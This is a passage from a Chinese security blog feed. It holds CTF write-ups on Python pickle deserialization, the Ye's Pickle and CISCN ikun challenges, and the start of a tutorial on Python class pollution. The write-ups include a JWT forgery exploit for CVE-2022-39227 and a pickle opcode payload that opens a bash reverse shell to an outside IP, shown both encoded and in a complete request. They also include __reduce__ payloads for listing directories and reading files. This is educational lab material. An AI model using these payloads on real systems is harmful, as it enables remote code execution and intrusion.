href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a></p><p>使用脚本来生成我们需要的opcode</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例:"></a>案例:</h2><h3 id="New-star-2023-Ye’s-Pickle"><a href="#New-star-2023-Ye’s-Pickle" class="headerlink" title="New star 2023 Ye’s Pickle"></a>New star 2023 Ye’s Pickle</h3><p>题目给出了附件</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto.jwk <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length=<span class="number">16</span></span>):</span><br><span class="line">    characters = string.ascii_letters + string.digits  <span class="comment"># 包含字母和数字</span></span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = generate_random_string(<span class="number">16</span>)</span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    payload=request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        token=verify_jwt(payload, key, [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">        jwt = generate_jwt(user, key, <span class="string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,token=jwt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pickle&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.loads(base64.b64decode(request.args.get(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>一开始会返回一个jwt token 这里涉及到一个cve的利用</p><p>CVE-2022-39227</p><p>直接用网上的利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_encode, base64url_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">topic</span>(<span class="params">topic</span>):</span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    <span class="built_in">print</span>(parsed_payload)</span><br><span class="line">    parsed_payload[<span class="string">&quot;role&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)))</span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="built_in">print</span>(fake_payload)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125; &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(topic(<span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDkxNDA5MjEsImlhdCI6MTcwOTEzNzMyMSwianRpIjoic0t1bEt5Q0VJSXFORDN2R3pKeGVqdyIsIm5iZiI6MTcwOTEzNzMyMSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.OfLoye4xwPW_8a7iakPPOXc9ki4EcbfTMG4Swm0Bo_9p6Wv5ZM0hGimwUKgweMNEsnUl6xXi47QIEaUSc2tS2CIchYHJs3quH0odaQoxlulyE3IOYh0-NzQfTymeqsmbejweyEQ1FiRjKyBgVNFL7eZa8ESp_2CIzeYmCmaaTjDfwVhgm7O6wTfwVoX4qjtPitQ-NWaSQ3lwQtXyveOGx3mqWiWY2d_STalqDv3bnUNyOkxXywkOpYM-OtVzY48lTD7m3BQTHLQ93C_3QYOHk_KzMDitnsekdC3gw3eDYdiVq8BruDgXrKHK7lxVBvvVFRv-NIwoO-E7wK1ukzC0gg&#x27;</span>))</span><br></pre></td></tr></table></figure><p>将结果作为参数token的值,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?token=&#123;&quot; eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDkxNDA2NDQsImlhdCI6MTcwOTEzNzA0NCwianRpIjoiNTZIUkVWbGgwNzgyb3JuNWhlRGY1dyIsIm5iZiI6MTcwOTEzNzA0NCwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9&quot;, &quot;payload&quot;:&quot;eyJleHAiOjE3MDkxNDA2NDQsImlhdCI6MTcwOTEzNzA0NCwianRpIjoiNTZIUkVWbGgwNzgyb3JuNWhlRGY1dyIsIm5iZiI6MTcwOTEzNzA0NCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9&quot;,&quot;signature&quot;:&quot;OXsPZvXsGqKReQFv9FMYwneKop1D757MA1WmPG4IsOze9An4tQtDGu3zycahr6EL0Xn-rcToH0hGyH4i9dt3jnWPxNTrqR1QRIclAOeGinN9wBnxyECNZf8_0gBGhazgvSdB2lHwLsuVoR2mSMndPhCMz9oJPATVqmpfhveYiT9N7uGTUJbbrXXaEF3BPU2T0vOChhDmqZGUw93qy5lIkxMhnSa6plSPovDdBv1aUKmWoGmy_TRAkFesL1NKjv7Wi0QjdcUge96Fv3mmqMp9_G-iafz7u9Ot-YyJ9VsOGqi_vBov6fTFZnJSzAwv49DgIeuVxa2sKtzR8970nk_owg&quot;&#125;</span><br></pre></td></tr></table></figure><p>会返回一个session, 就是admin的session</p><p>此时就可以取pickle这个路由下进行pickle</p><p>这里不会回显, 因此需要使用opcode构造一个反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/107.148.75.202/1234 0&gt;&amp;1\&quot;&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = base64.b64encode(opcode)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>b’Y29zCnN5c3RlbQooUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwNy4xNDguNzUuMjAyLzEyMzQgMD4mMSInCnRSLg&#x3D;&#x3D;’</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pickle?pickle=Y29zCnN5c3RlbQooUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwNy4xNDguNzUuMjAyLzEyMzQgMD4mMSInCnRSLg==</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>300e864c-da01-4bab-9750-6b5949530b2c.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJyb2xlIjoiYWRtaW4ifQ.Zd9egg.OdEGNtZQIeC9-nt3MzZmcX_uDRY</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229004733728.png" alt="image-20240229004733728"></p><p>得到flag</p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>进去后可以注册登录, 这些地方都测不出什么漏洞</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229133317018.png" alt="image-20240229133317018"></p><p>看了半天, 这里要求买到lv6, 翻了几页都没有lv6, 在static&#x2F;img目录下lv6.png确实存在. 这里需要用python脚本跑一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://e1b204f5-1beb-46b5-bf6b-9362c6510dfe.node5.buuoj.cn:81/shop?page=&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    res = requests.get(url=url.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line">   <span class="comment"># print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到lv6.png在page&#x3D;181</p><p>之后是修改折扣信息来购买</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160429059.png" alt="image-20240229160429059"></p><p>将dicount修改为一个很小的数</p><p>访问返回的&#x2F;b1g_m4mber提示需要admin, 这里用<a href="https://jwt.io/">https://jwt.io/</a> 和c-jwt-cracker 来伪造jwt</p><p>jwt 私钥破解</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229150958381.png" alt="image-20240229150958381"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160701863.png" alt="image-20240229160701863"></p><p>之后可以找到一个网站备份</p><p>涉及pickle的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (os.listdir,(<span class="string">&quot;/&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(a))</span><br></pre></td></tr></table></figure><p>这里要在python2环境下进行, python3里生成的payload并不奏效</p><p>这里并不能使用os.system来执行命令, 不知道为什么..</p><p>生成payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160938342.png" alt="image-20240229160938342"></p><p>读取flag.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;rb&#x27;).read()&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(a))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229161110656.png" alt="image-20240229161110656"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pickle反序列化&quot;&gt;&lt;a href=&quot;#pickle反序列化&quot; class=&quot;headerlink&quot; title=&quot;pickle反序列化&quot;&gt;&lt;/a&gt;pickle反序列化&lt;/h1&gt;&lt;p&gt;在pyhton中也存在序列化和反序列化的操作, 由pickle模块实现&lt;/p</summary>
      
    
    
    
    
    <category term="pickle反序列化" scheme="http://example.com/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Python 原链污染(类污染)</title>
    <link href="http://example.com/2024/02/27/Python-%E5%8E%9F%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
    <id>http://example.com/2024/02/27/Python-%E5%8E%9F%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/</id>
    <published>2024-02-27T15:24:04.000Z</published>
    <updated>2024-02-29T14:43:35.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python-原链污染-类污染"><a href="#Python-原链污染-类污染" class="headerlink" title="Python 原链污染(类污染)"></a>Python 原链污染(类污染)</h1><p>与JavaScript原型链污染类似, python也存在原型链污染的问题</p><p>不同的是, python的原型链污染其实是类污染, 并且__只能污染一些类属性, 而对类方法无效__</p><p>之前学习ssti是就知道 python可以通过一些魔术方法,类方法,类属性层层访问,直到调用到一些危险函数</p><p>因此python也存在链式访问,更改属性等问题</p><h2 id="merge函数"><a href="#merge函数" class="headerlink" title="merge函数"></a>merge函数</h2><p>在Javascript中, 最为常见的就是属性合并函数(merge)造成的原型链污染</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就造成了键值对可控,使得可以对父类的属性和方法进行污染修改</p><p>在python中, 也存在这样的merge函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:<span class="comment"># 若v仍然是一个字典, 递归地将其复制到dst中</span></span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)<span class="comment"># 将src下的k v添加到dst中</span></span><br></pre></td></tr></table></figure><h2 id="污染例子"><a href="#污染例子" class="headerlink" title="污染例子"></a>污染例子</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">tmp = son_a()</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="built_in">print</span>(tmp.secret)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">merge(payload, tmp)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment"># hello</span></span><br><span class="line"><span class="comment"># hello</span></span><br><span class="line"><span class="comment"># world</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里通过tmp.__class__.__base__将其父类(father类)下的secret属性更改造成污染</span><br></pre></td></tr></table></figure><p>同样的, 通过这种方法可以修改python的内置属性</p><blockquote><p><code>__str__</code> 是一个特殊方法（特殊方法也称为魔法方法或魔术方法）之一，在 Python 类中用于定义对象的字符串表示形式。当你调用内置的 <code>str()</code> 函数或 <code>print()</code> 函数来显示一个对象时，实际上是调用了该对象的 <code>__str__</code> 方法。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span 